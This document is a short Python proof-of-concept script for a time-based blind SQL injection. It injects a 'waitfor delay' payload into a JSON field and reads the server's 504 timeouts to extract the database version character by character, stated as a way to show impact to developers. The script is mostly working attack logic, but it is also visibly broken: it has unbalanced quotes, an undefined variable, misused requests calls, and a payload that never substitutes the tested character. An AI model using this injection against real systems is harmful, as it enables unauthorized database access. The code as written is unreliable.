#Author: Kymb0 and whoever he took code from to put this together
#Purpose: Showing impact to devs and project managers once a blind sql vector is found

import requests
import string

url="https://<WEBSITE>"

# In the future I will add a section to enumerate the password/username/version length yo

version = ('')

while True:
    Sleep=5
    #the list comprehension regarding adding the backslash is important as this stops the attack from breaking 		if c lands on a special character
    for c in list(string.ascii_letters+string.digits)+["\\"+c for c in string.punctuation+string.whitespace ]:
            
            # I just grab a request and use the copy as requests python module
            session = requests.session()

            burp0_url = "https://xxxxxxxxxxxxxxxxxxxxx"
            burp0_cookies = {"token": "xxxxxxxxxxxxxxxxxxxxx"", "UID": "7xxxxxxxxxxxxxxxxxxxxx"", "Role": "xxxxxxxxxxxxxxxxxxxxx""}
            burp0_headers = burp0_json={"Aggregation": "max' if(SUBSTRING(VERSION(),'1','0')=='{c}') waitfor delay'0:0:08'--", "Name": "dddddd"}
            payload=session.put(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)

            print("trying {0}".format(version+c))
            r = requests.post(url, payload)
            if int(pr.status_code)==504:
                version += c
                print("iterated {version}")
            else:
                print("nothing...Sending again")
print(("version = {0}".format(version)))
